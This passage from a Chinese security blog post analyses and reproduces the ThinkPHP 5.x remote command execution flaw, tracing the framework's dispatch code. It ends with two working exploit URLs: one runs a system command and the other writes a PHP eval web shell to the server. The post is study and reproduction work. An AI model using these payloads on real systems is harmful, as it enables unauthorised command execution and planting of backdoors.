+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="comment">// 监听module_init</span></span><br><span class="line">     <span class="keyword">$this</span>-&gt;app[<span class="string">'hook'</span>]-&gt;listen(<span class="string">'module_init'</span>);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">// 实例化控制器</span></span><br><span class="line">         $instance = <span class="keyword">$this</span>-&gt;app-&gt;controller(<span class="keyword">$this</span>-&gt;controller,</span><br><span class="line">             <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'url_controller_layer'</span>),</span><br><span class="line">             <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'controller_suffix'</span>),</span><br><span class="line">             <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'empty_controller'</span>));</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> ($instance <span class="keyword">instanceof</span> Controller) &#123;</span><br><span class="line">             $instance-&gt;registerMiddleware();</span><br><span class="line">         &#125;</span><br><span class="line">     &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'controller not exists:'</span> . $e-&gt;getClass());</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">$this</span>-&gt;app[<span class="string">'middleware'</span>]-&gt;controller(<span class="function"><span class="keyword">function</span> <span class="params">(Request $request, $next)</span> <span class="title">use</span> <span class="params">($instance)</span> </span>&#123;</span><br><span class="line">         <span class="comment">// 获取当前操作名</span></span><br><span class="line">         $action = <span class="keyword">$this</span>-&gt;actionName . <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'action_suffix'</span>);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">             <span class="comment">// 执行操作方法</span></span><br><span class="line">             $call = [$instance, $action];</span><br><span class="line"></span><br><span class="line">             <span class="comment">// 严格获取当前操作方法名</span></span><br><span class="line">             $reflect    = <span class="keyword">new</span> ReflectionMethod($instance, $action);</span><br><span class="line">             $methodName = $reflect-&gt;getName();</span><br><span class="line">             $suffix     = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'action_suffix'</span>);</span><br><span class="line">             $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">             <span class="keyword">$this</span>-&gt;request-&gt;setAction($actionName);</span><br><span class="line"></span><br><span class="line">             <span class="comment">// 自动获取请求变量</span></span><br><span class="line">             $vars = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'url_param_type'</span>)</span><br><span class="line">             ? <span class="keyword">$this</span>-&gt;request-&gt;route()</span><br><span class="line">             : <span class="keyword">$this</span>-&gt;request-&gt;param();</span><br><span class="line">             $vars = array_merge($vars, <span class="keyword">$this</span>-&gt;param);</span><br><span class="line">         &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">'_empty'</span>])) &#123;</span><br><span class="line">             <span class="comment">// 空操作</span></span><br><span class="line">             $call    = [$instance, <span class="string">'_empty'</span>];</span><br><span class="line">             $vars    = [<span class="keyword">$this</span>-&gt;actionName];</span><br><span class="line">             $reflect = <span class="keyword">new</span> ReflectionMethod($instance, <span class="string">'_empty'</span>);</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="comment">// 操作不存在</span></span><br><span class="line">             <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'method not exists:'</span> . get_class($instance) . <span class="string">'-&gt;'</span> . $action . <span class="string">'()'</span>);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">$this</span>-&gt;app[<span class="string">'hook'</span>]-&gt;listen(<span class="string">'action_begin'</span>, $call);</span><br><span class="line"></span><br><span class="line">         $data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);<span class="comment">//反射</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invokeReflectMethod</span><span class="params">($instance, $reflect, $vars = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $args = <span class="keyword">$this</span>-&gt;bindParams($reflect, $vars);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $reflect-&gt;invokeArgs($instance, $args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>虽然不了解php的反射性质，但是</p>
+<p>最后调试跟踪的时候，到了这里面</p>
+<p><img src="../AppData/Roaming/Typora/typora-user-images/image-20200505163614190.png" alt="image-20200505163614190"></p>
+<p>这里就是调用call_user_func_array 调用system ，然后执行命令</p>
+<p>前面的php中间件，不了解，但是调试过程中的构析真的恶习。跳来跳去。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9096/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line">命令执行</span><br><span class="line"></span><br><span class="line">http://localhost:9096/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20^%3C?php%20@eval($_GET[%22code%22])?^%3E%3Eshell.php</span><br><span class="line">写shell</span><br></pre></td></tr></table></figure>
+
+<p>第一次接触thinkphp 感觉代码都是怪怪的。一言难进。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a  href="/2020/05/05/ThinkPHP-5-x远程命令执行漏洞分析与复现/">ThinkPHP 5.x远程命令执行漏洞分析与复现</a></p>
+        <p><span>文章作者:</span><a  href="/" title="访问 Ordin 的个人博客">Ordin</a></p>
+        <p><span>发布时间:</span>2020年05月05日 - 13时56分</p>
+        <p><span>最后更新:</span>2020年05月05日 - 16时42分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2020/05/05/ThinkPHP-5-x远程命令执行漏洞分析与复现/" title="ThinkPHP 5.x远程命令执行漏洞分析与复现">https://leave-Devour.github.io/2020/05/05/ThinkPHP-5-x远程命令执行漏洞分析与复现/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://leave-Devour.github.io/2020/05/05/ThinkPHP-5-x远程命令执行漏洞分析与复现/　　作者: Ordin" title=""></span>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+  
+    <a  href="/2020/05/04/BUUOJ刷题-1/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">BUUOJ刷题(1)</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <section class="changyan" id="comments">
+  <!--<div id="uyan_frame"></div>-->
+  <div id="SOHUCS"></div>
+  <script charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/changyan.js"></script>
+  <script type="text/javascript">
+    window.changyan.api.config({
+      appid: 'xxxx',
+      conf: 'xxxxxxxxx'
+    });
+  </script>
+</section>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a  href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a  href="/2020/05/04/BUUOJ刷题-1/" title="下一篇: BUUOJ刷题(1)">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/05/05/ThinkPHP-5-x远程命令执行漏洞分析与复现/">ThinkPHP 5.x远程命令执行漏洞分析与复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/04/BUUOJ刷题-1/">BUUOJ刷题(1)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/02/Linux-kernel-整数溢出-堆溢出漏洞及其利用与分析/">Linux kernel 整数溢出-堆溢出漏洞及其利用与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/14/(转载自360安全客)高校战疫的两道kernel/">(转载自360安全客)从高校战疫的两道kernel学习kernel</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/14/AFL安装/">AFL安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/12/kernel-pwn-ret2usr-and-rop/">kernel pwn ret2usr and rop</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/12/angr安装/">angr安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/12/p4fmt-TeaserCONFidence2019-CTF/">p4fmt TeaserCONFidence2019 CTF </a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/23/reversing-kr-Easy-crack/">Easy_crack</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/23/Pwnable-kr-input/">input</a></li></ul>
+    
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+    <script>
+        $(".post-list").addClass("toc-article");
+        // $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
+
+
+
+
+    <script>
+        
+    </script>
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2020 Ordin
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo &nbsp;&nbsp;</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >极客到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 7;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'xxxxx', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+	<script>
+	var _hmt = _hmt || [];
+	(function() {
+	  var hm = document.createElement("script");
+	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
+	  var s = document.getElementsByTagName("script")[0]; 
+	  s.parentNode.insertBefore(hm, s);
+	})();
+	</script>
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+    <script type="text/javascript" src="/js/clicklove.js"></script>
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"right","width":250,"height":500},"mobile":{"show":true}});</script></body>
+
+</html>
